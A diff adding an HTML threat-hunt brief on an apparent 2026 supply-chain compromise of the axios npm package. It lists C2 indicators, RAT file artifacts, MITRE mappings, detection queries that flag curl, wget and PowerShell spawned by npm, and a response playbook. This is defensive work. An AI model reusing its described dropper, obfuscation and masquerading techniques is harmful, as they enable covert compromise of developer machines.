+            <li>Same C2 beacon / command vocabulary as macOS</li>
+          </ul>
+        </div>
+      </div>
+      <div class="platform-card">
+        <div class="platform-header linux">🐧 Linux</div>
+        <div class="platform-body">
+          <ul>
+            <li>Downloads <code>ringtone.wav</code> from C2 (XOR-obfuscated binary)</li>
+            <li>Python script dropped to <code>/tmp/ld.py</code></li>
+            <li>Identical C2 protocol and command vocabulary</li>
+            <li>Targets CI/CD runners, containers, cloud VMs</li>
+            <li>High-value on self-hosted GitHub Actions runners (cloud creds, PATs)</li>
+            <li>John Hammond published full Linux payload at GitHub Gist</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <h3 style="color:#fff; font-size:16px; margin-bottom:14px; margin-top:28px;">John Hammond's Key Finding — Huntress</h3>
+
+    <div class="quote-card">
+      <blockquote>"Developer workstations and CI/CD runners, which routinely hold SSH keys, cloud credentials, and API tokens, are the highest-value targets here. All three platform variants share an identical C2 protocol and command vocabulary — this is a unified, professionally engineered cross-platform RAT, not a quick hack."</blockquote>
+      <div class="quote-attr">— <span>John Hammond</span>, Senior Principal Security Researcher, Huntress</div>
+    </div>
+
+    <p>Hammond's analysis confirmed that the macOS, Windows, and Linux payloads share the same C2 beacon structure and command set, indicating a sophisticated, purpose-built cross-platform RAT framework — not an opportunistic script. The attacker appears to have invested significant resources in building infrastructure ahead of the attack. Huntress confirmed <strong>135+ endpoints</strong> within their partner network reached out to C2 during the exposure window.</p>
+
+    <h3 style="color:#fff; font-size:16px; margin-bottom:14px; margin-top:24px;">Related Malicious Packages (Same Campaign)</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Package</th><th>Versions</th><th>Role</th></tr></thead>
+        <tbody>
+          <tr><td><span class="ioc">plain-crypto-js</span></td><td>4.2.0 (decoy clean), 4.2.1 (malicious)</td><td>Primary dropper — executes RAT via postinstall hook</td></tr>
+          <tr><td><span class="ioc">@shadanai/openclaw</span></td><td>2026.3.31-1, 2026.3.31-2</td><td>Related campaign package — treat as malicious</td></tr>
+          <tr><td><span class="ioc">@qqbrowser/openclaw-qbot</span></td><td>0.0.130</td><td>Related campaign package — treat as malicious</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 04 IOCs -->
+  <section id="iocs">
+    <div class="section-header">
+      <span class="section-num warn">04</span>
+      <h2>Indicators of Compromise (IOCs)</h2>
+    </div>
+
+    <div class="alert alert-warn">
+      <span class="alert-icon">📋</span>
+      <div class="alert-body">
+        <div class="alert-title">TLP:AMBER — Block at Perimeter Now</div>
+        <p>Block <span class="ioc">sfrclak[.]com</span> and <span class="ioc">142.11.206.73</span> at firewall/DNS immediately. These are live C2 infrastructure as of this writing. All C2 indicators are defanged.</p>
+      </div>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin-bottom:12px;">Network Indicators</h3>
+    <div class="table-wrap" style="margin-bottom: 24px;">
+      <table>
+        <thead><tr><th>Indicator</th><th>Type</th><th>Details</th><th>Confidence</th></tr></thead>
+        <tbody>
+          <tr><td><span class="ioc">sfrclak[.]com</span></td><td>Domain</td><td>Primary C2 — all platforms beacon here on port 8000</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><span class="ioc">142.11.206.73</span></td><td>IPv4</td><td>C2 server IP — resolves sfrclak.com</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><code>:8000/6202033</code></td><td>URL Pattern</td><td>Dropper C2 endpoint — all platforms</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><code>/product0</code></td><td>URL Path</td><td>macOS second-stage RAT download path</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><code>/product1</code></td><td>URL Path</td><td>Windows second-stage payload download path</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><code>/product2</code></td><td>URL Path</td><td>Linux second-stage payload download path</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><code>hangup.wav</code></td><td>URL / Filename</td><td>Windows XOR-obfuscated EXE disguised as audio file</td><td class="td-warn">HIGH</td></tr>
+          <tr><td><code>ringtone.wav</code></td><td>URL / Filename</td><td>Linux XOR-obfuscated binary disguised as audio</td><td class="td-warn">HIGH</td></tr>
+          <tr><td><code>mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)</code></td><td>User-Agent</td><td>Fake UA used by RAT — IE8 / XP era (evasion)</td><td class="td-warn">MEDIUM</td></tr>
+          <tr><td>60-second beacon interval</td><td>Behavior</td><td>All platforms POST system inventory every 60s to C2</td><td class="td-warn">MEDIUM</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin-bottom:12px;">File System Indicators</h3>
+    <div class="table-wrap" style="margin-bottom: 24px;">
+      <table>
+        <thead><tr><th>Platform</th><th>Artifact</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td class="td-muted">Any</td><td><span class="ioc">node_modules/plain-crypto-js/</span></td><td><strong>Primary indicator</strong> — this directory should NOT exist in any legitimate axios install. Presence = dropper ran.</td></tr>
+          <tr><td class="td-muted">macOS</td><td><span class="ioc">/Library/Caches/com.apple.act.mond</span></td><td>C++ Mach-O RAT binary — disguised as Apple system cache file</td></tr>
+          <tr><td class="td-muted">Windows</td><td><span class="ioc">%PROGRAMDATA%\wt.exe</span></td><td>PowerShell copy — EDR evasion (mimics Windows Terminal)</td></tr>
+          <tr><td class="td-muted">Windows</td><td><span class="ioc">%TEMP%\6202033.vbs</span></td><td>VBScript dropper wrapper</td></tr>
+          <tr><td class="td-muted">Windows</td><td><span class="ioc">%TEMP%\6202033.ps1</span></td><td>PowerShell second-stage payload script</td></tr>
+          <tr><td class="td-muted">Linux</td><td><span class="ioc">/tmp/ld.py</span></td><td>Python RAT script — mimics Linux dynamic linker naming</td></tr>
+          <tr><td class="td-muted">Any</td><td>axios@1.14.1 or @0.30.4 in package.json/lockfile</td><td>Compromised version in dependency manifest</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin-bottom:12px;">Package &amp; Account Indicators</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Indicator</th><th>Type</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td><span class="ioc purple">ifstap@proton.me</span></td><td>Email (attacker)</td><td>Email used to replace jasonsaayman's npm account email</td></tr>
+          <tr><td><span class="ioc purple">nrwise@proton.me</span></td><td>Email (attacker)</td><td>Published the decoy clean plain-crypto-js@4.2.0</td></tr>
+          <tr><td><span class="ioc">plain-crypto-js@4.2.1</span></td><td>npm package</td><td>Primary malicious dropper — GHSA-fw8c-xr5c-95f9</td></tr>
+          <tr><td><span class="ioc">axios@1.14.1</span></td><td>npm package</td><td>Malicious — tagged "latest" during attack window</td></tr>
+          <tr><td><span class="ioc">axios@0.30.4</span></td><td>npm package</td><td>Malicious — tagged "legacy" during attack window</td></tr>
+          <tr><td><span class="ioc">@shadanai/openclaw</span></td><td>npm package</td><td>Campaign-related — treat as malicious</td></tr>
+          <tr><td><span class="ioc">@qqbrowser/openclaw-qbot</span></td><td>npm package</td><td>Campaign-related — treat as malicious</td></tr>
+          <tr><td>GHSA-fw8c-xr5c-95f9</td><td>Advisory ID</td><td>GitHub Security Advisory for this incident</td></tr>
+          <tr><td>MAL-2026-2306</td><td>Advisory ID</td><td>Malware advisory ID — referenced in vulnerability databases</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 05 MITRE -->
+  <section id="mitre">
+    <div class="section-header">
+      <span class="section-num green">05</span>
+      <h2>MITRE ATT&amp;CK Mapping</h2>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Tactic</th><th>Technique ID</th><th>Technique Name</th><th>How It Was Used</th></tr></thead>
+        <tbody>
+          <tr><td>Initial Access</td><td><span class="mitre-id">T1195.002</span></td><td>Supply Chain Compromise: Compromise Software Supply Chain</td><td>Backdoored axios npm package via compromised maintainer account</td></tr>
+          <tr><td>Initial Access</td><td><span class="mitre-id">T1078</span></td><td>Valid Accounts</td><td>Hijacked jasonsaayman npm account; changed email to attacker-controlled ProtonMail</td></tr>
+          <tr><td>Execution</td><td><span class="mitre-id">T1059.007</span></td><td>Command and Scripting Interpreter: JavaScript</td><td>postinstall hook in setup.js executes dropper via npm lifecycle</td></tr>
+          <tr><td>Execution</td><td><span class="mitre-id">T1059.001</span></td><td>Command and Scripting Interpreter: PowerShell</td><td>Windows payload runs PS1 with -ep bypass using renamed wt.exe</td></tr>
+          <tr><td>Execution</td><td><span class="mitre-id">T1059.005</span></td><td>Command and Scripting Interpreter: VBScript</td><td>VBScript wrapper (6202033.vbs) used as Windows payload stage</td></tr>
+          <tr><td>Execution</td><td><span class="mitre-id">T1059.006</span></td><td>Command and Scripting Interpreter: Python</td><td>Linux RAT delivered as /tmp/ld.py Python script</td></tr>
+          <tr><td>Persistence</td><td><span class="mitre-id">T1543</span></td><td>Create or Modify System Process</td><td>macOS RAT persists at /Library/Caches/com.apple.act.mond</td></tr>
+          <tr><td>Defense Evasion</td><td><span class="mitre-id">T1027</span></td><td>Obfuscated Files or Information</td><td>Reversed Base64 + XOR (OrDeR_7077/333); EXE hidden inside .wav audio files</td></tr>
+          <tr><td>Defense Evasion</td><td><span class="mitre-id">T1036.005</span></td><td>Masquerading: Match Legitimate Name or Location</td><td>wt.exe mimics Windows Terminal; /tmp/ld.py mimics Linux dynamic linker; com.apple.act.mond mimics Apple system process</td></tr>
+          <tr><td>Defense Evasion</td><td><span class="mitre-id">T1070.004</span></td><td>Indicator Removal: File Deletion</td><td>setup.js self-destructs; package.json restored to clean version post-execution</td></tr>
+          <tr><td>Discovery</td><td><span class="mitre-id">T1082</span></td><td>System Information Discovery</td><td>RAT fingerprints hostname, username, OS version, CPU type, boot time, processes</td></tr>
+          <tr><td>Discovery</td><td><span class="mitre-id">T1083</span></td><td>File and Directory Discovery</td><td>rundir command enumerates filesystem; Library/Application directories swept</td></tr>
+          <tr><td>C2</td><td><span class="mitre-id">T1071.001</span></td><td>Application Layer Protocol: Web Protocols</td><td>HTTP POST to sfrclak.com:8000 every 60 seconds; Base64-encoded beacon body</td></tr>
+          <tr><td>C2</td><td><span class="mitre-id">T1008</span></td><td>Fallback Channels</td><td>Platform-specific C2 paths (/product0-2) allow selective tasking by OS</td></tr>
+          <tr><td>Exfiltration</td><td><span class="mitre-id">T1041</span></td><td>Exfiltration Over C2 Channel</td><td>System inventory, processes, and filesystem data exfiltrated over beacon channel</td></tr>
+          <tr><td>Execution</td><td><span class="mitre-id">T1072</span></td><td>Software Deployment Tools</td><td>npm postinstall hook used as execution mechanism — bypasses most endpoint controls</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 06 HUNTING -->
+  <section id="hunting">
+    <div class="section-header">
+      <span class="section-num purple">06</span>
+      <h2>Threat Hunting Queries &amp; Detection</h2>
+    </div>
+
+    <p>Focus hunting on: npm install logs, network connections to C2, filesystem artifact presence, and suspicious process spawns from Node.js. Don't forget CI/CD build logs — runners that installed axios during the exposure window are critical targets.</p>
+
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">Host-Based — Rapid Compromise Check</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash — Axios Compromise Detection Script</span>
+        <span class="code-desc">Run on every Node.js host, CI runner, and developer workstation</span>
+      </div>
+      <pre><span class="cm">#!/bin/bash</span>
+<span class="cm"># Axios npm Supply Chain — Compromise Detection</span>
+<span class="cm"># Usage: bash axios-hunt.sh | tee axios-hunt-$(hostname).txt</span>
+
+echo <span class="st">"=== [1] Checking axios version ==="</span>
+npm list axios 2>/dev/null | grep axios
+cat package.json 2>/dev/null | grep -i axios
+cat package-lock.json 2>/dev/null | grep -A2 <span class="st">'"axios"'</span>
+
+echo <span class="st">"=== [2] Scanning for plain-crypto-js (primary IOC) ==="</span>
+find / -type d -name <span class="st">"plain-crypto-js"</span> 2>/dev/null \
+  &amp;&amp; echo <span class="st">"!!! ALERT: plain-crypto-js directory found — dropper likely ran !!!"</span>
+
+echo <span class="st">"=== [3] Checking platform-specific RAT artifacts ==="</span>
+<span class="cm"># macOS</span>
+<span class="op">test</span> -f <span class="st">"/Library/Caches/com.apple.act.mond"</span> \
+  &amp;&amp; echo <span class="st">"ALERT: macOS RAT binary found: com.apple.act.mond"</span>
+<span class="cm"># Linux</span>
+<span class="op">test</span> -f <span class="st">"/tmp/ld.py"</span> \
+  &amp;&amp; echo <span class="st">"ALERT: Linux RAT found: /tmp/ld.py"</span>
+<span class="cm"># Windows (adapt for WSL/cross-check)</span>
+ls /mnt/c/ProgramData/wt.exe 2>/dev/null \
+  &amp;&amp; echo <span class="st">"ALERT: Windows payload: ProgramData\wt.exe"</span>
+
+echo <span class="st">"=== [4] Checking active C2 connections ==="</span>
+ss -tnp | grep <span class="st">"142.11.206"</span>
+ss -tnp | grep <span class="st">":8000"</span>
+netstat -tnp 2>/dev/null | grep <span class="st">"sfrclak\|142.11.206"</span>
+
+echo <span class="st">"=== [5] DNS C2 check ==="</span>
+host sfrclak.com 2>/dev/null | grep <span class="st">"142.11.206"</span> \
+  &amp;&amp; echo <span class="st">"ALERT: C2 domain resolves"</span>
+
+echo <span class="st">"=== [6] Searching node_modules trees for malicious dep ==="</span>
+find . /home /opt /var /srv -path <span class="st">"*/plain-crypto-js/package.json"</span> 2>/dev/null \
+  | xargs -I{} sh -c <span class="st">'echo "ALERT: {}"; cat "{}"'</span>
+
+echo <span class="st">"=== [7] npm audit (requires npm installed) ==="</span>
+npm audit 2>/dev/null | grep -i <span class="st">"axios\|plain-crypto"</span>
+
+echo <span class="st">"=== HUNT COMPLETE ==="</span></pre>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">SIEM — Microsoft Sentinel KQL</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">KQL — Microsoft Sentinel</span>
+        <span class="code-desc">C2 beaconing detection — sfrclak.com / 142.11.206.73</span>
+      </div>
+      <pre><span class="cm">// Axios RAT C2 Detection — sfrclak.com beaconing</span>
+<span class="cm">// Look for 60-second interval beacons — key behavioral signature</span>
+<span class="kw">let</span> C2_IPs     = dynamic([<span class="st">"142.11.206.73"</span>]);
+<span class="kw">let</span> C2_Domains = dynamic([<span class="st">"sfrclak.com"</span>]);
+<span class="kw">let</span> HuntStart  = datetime(2026-03-31T00:00:00Z);
+
+DeviceNetworkEvents
+| <span class="kw">where</span> TimeGenerated > HuntStart
+| <span class="kw">where</span> RemoteIP <span class="kw">in</span> (C2_IPs)
+    <span class="kw">or</span> RemoteUrl <span class="fn">has_any</span> (C2_Domains)
+    <span class="kw">or</span> RemotePort == <span class="nm">8000</span>
+| <span class="kw">project</span> TimeGenerated, DeviceName, InitiatingProcessAccountName,
+          InitiatingProcessFileName, InitiatingProcessCommandLine,
+          RemoteIP, RemoteUrl, RemotePort, BytesSent, BytesReceived
+| <span class="kw">extend</span> ThreatName = <span class="st">"Axios-RAT-C2"</span>, Severity = <span class="st">"Critical"</span>
+| <span class="kw">order by</span> TimeGenerated <span class="kw">desc</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">KQL — Microsoft Sentinel</span>
+        <span class="code-desc">Node.js / npm spawning suspicious child processes — postinstall execution</span>
+      </div>
+      <pre><span class="cm">// Detect npm postinstall hook spawning network-capable processes</span>
+<span class="cm">// Covers: setup.js execution, dropper running curl/python/powershell</span>
+DeviceProcessEvents
+| <span class="kw">where</span> TimeGenerated > datetime(2026-03-31T00:00:00Z)
+| <span class="kw">where</span> InitiatingProcessFileName <span class="kw">in~</span> (<span class="st">"node.exe"</span>, <span class="st">"node"</span>, <span class="st">"npm"</span>, <span class="st">"npm.cmd"</span>)
+      <span class="kw">and</span> FileName <span class="kw">in~</span> (<span class="st">"powershell.exe"</span>, <span class="st">"wt.exe"</span>, <span class="st">"wscript.exe"</span>, <span class="st">"cscript.exe"</span>,
+                        <span class="st">"python.exe"</span>, <span class="st">"python3"</span>, <span class="st">"curl"</span>, <span class="st">"wget"</span>, <span class="st">"bash"</span>, <span class="st">"sh"</span>)
+| <span class="kw">project</span> TimeGenerated, DeviceName, AccountName,
+          InitiatingProcessFileName, InitiatingProcessCommandLine,
+          FileName, ProcessCommandLine, FolderPath
+| <span class="kw">extend</span> Alert = <span class="st">"HIGH - npm spawned suspicious process"</span>
+| <span class="kw">order by</span> TimeGenerated <span class="kw">desc</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">KQL — Microsoft Sentinel</span>
+        <span class="code-desc">File creation of known RAT artifacts across all platforms</span>
+      </div>
+      <pre><span class="cm">// Detect file creation of platform-specific Axios RAT artifacts</span>
+DeviceFileEvents
+| <span class="kw">where</span> TimeGenerated > datetime(2026-03-31T00:00:00Z)
+| <span class="kw">where</span> FileName <span class="kw">in</span> (<span class="st">"com.apple.act.mond"</span>, <span class="st">"ld.py"</span>, <span class="st">"6202033.vbs"</span>, <span class="st">"6202033.ps1"</span>)
+    <span class="kw">or</span> FolderPath <span class="fn">has</span> <span class="st">"plain-crypto-js"</span>
+    <span class="kw">or</span> (FileName == <span class="st">"wt.exe"</span> <span class="kw">and</span> FolderPath <span class="fn">has</span> <span class="st">"ProgramData"</span>)
+| <span class="kw">project</span> TimeGenerated, DeviceName, InitiatingProcessAccountName,
+          ActionType, FolderPath, FileName, SHA256, InitiatingProcessFileName
+| <span class="kw">extend</span> Alert = <span class="st">"CRITICAL - Axios RAT Artifact Created"</span>
+| <span class="kw">order by</span> TimeGenerated <span class="kw">desc</span></pre>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">SIEM — Splunk SPL Queries</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Splunk SPL</span>
+        <span class="code-desc">C2 network detection + 60-second beacon pattern</span>
+      </div>
+      <pre><span class="cm">| Detect Axios RAT C2 traffic to sfrclak.com / 142.11.206.73</span>
+index=network_traffic earliest=2026-03-31T00:00:00
+  (dest_ip="142.11.206.73" OR dest_host="*sfrclak*" OR dest_port=8000)
+| eval threat="AxiosRAT-C2"
+| eval severity="CRITICAL"
+| table _time, src_ip, src_host, dest_ip, dest_host, dest_port,
+        bytes_out, bytes_in, process, user
+| sort -_time
+
+<span class="cm">| Hunt for 60-second beacon regularity (RAT signature)</span>
+index=network_traffic dest_host="*sfrclak*"
+| bucket _time span=1m
+| stats count by _time, src_host, dest_host
+| where count >= 1
+| eval beacon_note="Regular 60s C2 beacon from Axios RAT"
+| sort -_time</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Splunk SPL</span>
+        <span class="code-desc">Node.js / npm postinstall spawning network tools — behavioral detection</span>
+      </div>
+      <pre><span class="cm">| Detect npm postinstall hook spawning suspicious processes (Windows + Linux)</span>
+index=endpoint sourcetype=sysmon EventCode=1 earliest=2026-03-31T00:00:00
+  (parent_process_name IN ("node.exe","node","npm","npm.cmd"))
+  (process_name IN ("powershell.exe","wscript.exe","cscript.exe","python.exe",
+                    "python3","curl","wget","sh","bash","wt.exe"))
+| eval risk="HIGH - npm lifecycle hook spawned suspicious process"
+| table _time, host, user, parent_process_name, process_name,
+        process_path, cmdline
+| sort -_time
+
+<span class="cm">| EDR evasion: wt.exe (PowerShell copy) in ProgramData — Windows specific</span>
+index=endpoint sourcetype=sysmon EventCode=1
+  process_path="*ProgramData*wt.exe*" OR process_name="wt.exe"
+  NOT process_path="*WindowsApps*"
+| eval alert="CRITICAL - PowerShell masquerading as Windows Terminal (Axios RAT)"
+| table _time, host, user, process_path, cmdline</pre>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">CI/CD Pipeline — GitHub Actions Audit</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Bash — CI/CD Build Log Audit</span>
+        <span class="code-desc">Identify builds that may have installed compromised axios versions</span>
+      </div>
+      <pre><span class="cm"># Search GitHub Actions build logs for compromised axios install</span>
+<span class="cm"># Run via GitHub CLI: gh run list --limit 200 then check each log</span>
+
+<span class="cm"># List runs from March 31 window</span>
+gh run list --repo <YOUR_ORG>/<YOUR_REPO> \
+  --created 2026-03-31 \
+  --json databaseId,conclusion,createdAt,workflowName \
+  | jq <span class="st">'.[] | select(.createdAt > "2026-03-31T00:00:00Z")'</span>
+
+<span class="cm"># For each suspicious run ID, check if axios@1.14.1 or @0.30.4 was installed</span>
+<span class="kw">for</span> run_id in $(gh run list --limit 50 --json databaseId -q <span class="st">'.[].databaseId'</span>); <span class="kw">do</span>
+  gh run view $run_id --log 2>/dev/null \
+    | grep -i <span class="st">"axios@1\.14\.1\|axios@0\.30\.4\|plain-crypto-js\|sfrclak"</span> \
+    &amp;&amp; echo <span class="st">"ALERT: Compromised install in run $run_id"</span>
+<span class="kw">done</span>
+
+<span class="cm"># Check if any runner may have had cloud credentials exfiltrated</span>
+<span class="cm"># Review: AWS_SECRET_ACCESS_KEY, AZURE_CLIENT_SECRET, GOOGLE_APPLICATION_CREDENTIALS</span>
+<span class="cm"># in workflow environment variables for runs during the exposure window</span></pre>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin:20px 0 12px;">Old IE8 User-Agent — Network Detection</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">KQL — Defender for Endpoint / Proxy Logs</span>
+        <span class="code-desc">Hunt for the RAT's fake IE8/XP User-Agent string — unusual in any modern environment</span>
+      </div>
+      <pre><span class="cm">// The Axios RAT uses a 25-year-old fake User-Agent — extremely anomalous</span>
+<span class="cm">// "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"</span>
+DeviceNetworkEvents
+| <span class="kw">where</span> TimeGenerated > datetime(2026-03-31)
+| <span class="kw">where</span> AdditionalFields <span class="fn">has</span> <span class="st">"msie 8.0"</span>
+    <span class="kw">or</span> AdditionalFields <span class="fn">has</span> <span class="st">"windows nt 5.1"</span>
+    <span class="kw">or</span> AdditionalFields <span class="fn">has</span> <span class="st">"trident/4.0"</span>
+| <span class="kw">project</span> TimeGenerated, DeviceName, RemoteIP, RemoteUrl,
+          InitiatingProcessFileName, AdditionalFields
+| <span class="kw">extend</span> Alert = <span class="st">"CRITICAL - Axios RAT UA detected (IE8/XP masquerade)"</span></pre>
+    </div>
+  </section>
+
+  <!-- 07 IR -->
+  <section id="response">
+    <div class="section-header">
+      <span class="section-num warn">07</span>
+      <h2>Incident Response Playbook — GovCon &amp; GCC</h2>
+    </div>
+
+    <ul class="step-list">
+      <li>
+        <div>
+          <h4>Identify All Affected Environments</h4>
+          <p>Scan all developer workstations, Node.js servers, Docker images, CI/CD runners, Lambda/Azure Function deployment packages, and container registries for <code>axios@1.14.1</code> or <code>axios@0.30.4</code>. Search <code>package.json</code>, <code>package-lock.json</code>, and <code>yarn.lock</code> files across all repos. Check Docker image layers built on or after March 31, 2026 00:00 UTC.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Check for plain-crypto-js Presence</h4>
+          <p>The <strong>definitive indicator</strong>: run <code>find / -type d -name "plain-crypto-js" 2>/dev/null</code>. This directory has <em>no</em> legitimate reason to exist in any axios installation. Its presence means the dropper executed — regardless of whether the RAT is still running.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Isolate and Preserve</h4>
+          <p>Take network-isolated snapshots of affected hosts before cleanup. For GovCon environments: preserve forensic evidence per DFARS 252.204-7012 requirements. Collect: running process list, network connections, bash/powershell history, all files under node_modules.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Terminate RAT Processes</h4>
+          <p>Kill: <code>com.apple.act.mond</code> (macOS), <code>wt.exe</code> from ProgramData (Windows), <code>ld.py</code> Python process (Linux). Check for 60-second periodic processes. Block C2 at firewall: <code>sfrclak.com</code> and <code>142.11.206.73</code> port 8000.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Rotate ALL Secrets on Affected Systems</h4>
+          <p>Mandatory rotation: LLM API keys, AWS/GCP/Azure credentials, SSH keypairs, GitHub PATs and Actions secrets, npm publish tokens, Kubernetes service account tokens, database passwords, .env values, HashiCorp Vault tokens, and any cloud-provider credentials accessible in the environment at time of compromise.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Downgrade axios to Safe Version</h4>
+          <p>Uninstall and reinstall: <code>npm uninstall axios &amp;&amp; npm install axios@1.14.0</code> or <code>npm install axios@0.30.3</code>. Pin the version in <code>package.json</code>. Remove <code>plain-crypto-js</code> from node_modules and lockfiles. Rebuild affected Docker images from scratch.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>Audit CI/CD Build History</h4>
+          <p>Review all GitHub Actions / GitLab CI / Jenkins builds that ran npm install between 2026-03-31 00:00 UTC and npm's package removal. Treat any runner that installed axios during this window as compromised — rotate all secrets that runner had access to.</p>
+        </div>
+      </li>
+      <li>
+        <div>
+          <h4>GovCon Reporting Obligations</h4>
+          <p>If CUI-adjacent systems were affected: assess FISMA/CMMC reporting requirements. Review DFARS 252.204-7012 cyber incident reporting (72-hour DoD notification window). GCC tenants should coordinate with ISSO and review FedRAMP boundary impact documentation.</p>
+        </div>
+      </li>
+    </ul>
+
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- 08 Resources -->
+  <section id="resources">
+    <div class="section-header">
+      <span class="section-num blue">08</span>
+      <h2>Resources &amp; References</h2>
+    </div>
+
+    <ul class="resource-list">
+      <li>
+        <span class="resource-icon">🔌</span>
+        <div class="resource-body">
+          <a href="https://socket.dev/blog/axios-npm-package-compromised" target="_blank">Socket.dev — Supply Chain Attack on Axios: Technical Analysis (Primary Source)</a>
+          <p>First detection; full payload deobfuscation; 6-minute detection timeline; platform-specific payload breakdown</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🎯</span>
+        <div class="resource-body">
+          <a href="https://www.huntress.com/blog/supply-chain-compromise-axios-npm-package" target="_blank">Huntress — Supply-Chain Compromise of axios npm Package (John Hammond)</a>
+          <p>Linux payload published as GitHub Gist; 135+ endpoint C2 contacts confirmed in partner network; cross-platform RAT analysis</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🐍</span>
+        <div class="resource-body">
+          <a href="https://snyk.io/blog/axios-npm-package-compromised-supply-chain-attack-delivers-cross-platform/" target="_blank">Snyk — Axios npm Package Compromised: Supply Chain Attack Delivers Cross-Platform RAT</a>
+          <p>Developer-focused remediation; dependency tree analysis; AppSec recommendations</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🔍</span>
+        <div class="resource-body">
+          <a href="https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack" target="_blank">Wiz — Axios NPM Distribution Compromised in Supply Chain Attack</a>
+          <p>Cloud security perspective; GCC/cloud credential exposure analysis; container image impact</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🛡️</span>
+        <div class="resource-body">
+          <a href="https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan" target="_blank">StepSecurity — axios Compromised on npm: Malicious Versions Drop Remote Access Trojan</a>
+          <p>CI/CD security perspective; GitHub Actions runner exposure; 2-second detonation detail</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🎯</span>
+        <div class="resource-body">
+          <a href="https://thehackernews.com/2026/03/axios-supply-chain-attack-pushes-cross.html" target="_blank">The Hacker News — Axios Supply Chain Attack Pushes Cross-Platform RAT via Compromised npm Account</a>
+          <p>Broad coverage; maintainer account compromise details; C2 infrastructure summary</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">📋</span>
+        <div class="resource-body">
+          <a href="https://advisories.gitlab.com/pkg/npm/axios/GHSA-fw8c-xr5c-95f9/" target="_blank">GHSA-fw8c-xr5c-95f9 — GitHub Security Advisory</a>
+          <p>Official advisory record; affected versions; CVSS scoring; package hashes</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🔬</span>
+        <div class="resource-body">
+          <a href="https://semgrep.dev/blog/2026/axios-supply-chain-incident-indicators-of-compromise-and-how-to-contain-the-threat/" target="_blank">Semgrep — Axios Supply Chain Incident: Indicators of Compromise</a>
+          <p>Code scanning detection rules; SAST approaches for dependency auditing; containment steps</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🌐</span>
+        <div class="resource-body">
+          <a href="https://socradar.io/blog/axios-npm-supply-chain-attack-2026-ciso-guide/" target="_blank">SOCRadar — Axios npm Hijack 2026: IOCs, Impact &amp; Remediation (CISO Guide)</a>
+          <p>Executive-level summary; IOC compilation; regulatory reporting guidance</p>
+        </div>
+      </li>
+      <li>
+        <span class="resource-icon">🏃</span>
+        <div class="resource-body">
+          <a href="https://vercel.com/changelog/axios-package-compromise-and-remediation-steps" target="_blank">Vercel — Axios Package Compromise and Remediation Steps</a>
+          <p>Platform-specific guidance for Vercel deployments; serverless / edge function exposure analysis</p>
+        </div>
+      </li>
+    </ul>
+  </section>
+
+</div>
+</main>
+
+<footer>
+  <div class="container">
+    <p><strong>SOC Threat Hunt Brief — Axios npm Supply Chain Attack (March 31, 2026)</strong></p>
+    <p style="margin-top:6px;">GHSA-fw8c-xr5c-95f9 &nbsp;|&nbsp; MAL-2026-2306 &nbsp;|&nbsp; TLP:AMBER &nbsp;|&nbsp; Cross-Platform RAT &nbsp;|&nbsp; Attacker: Unknown</p>
+    <p style="margin-top:8px; color:#555;">This document is intended for internal SOC personnel and authorized GovCon/GCC security teams. Handle per TLP:AMBER guidelines. Block C2 at perimeter immediately. All network indicators are defanged.</p>
+  </div>
+</footer>
+
+</body>
+</html>
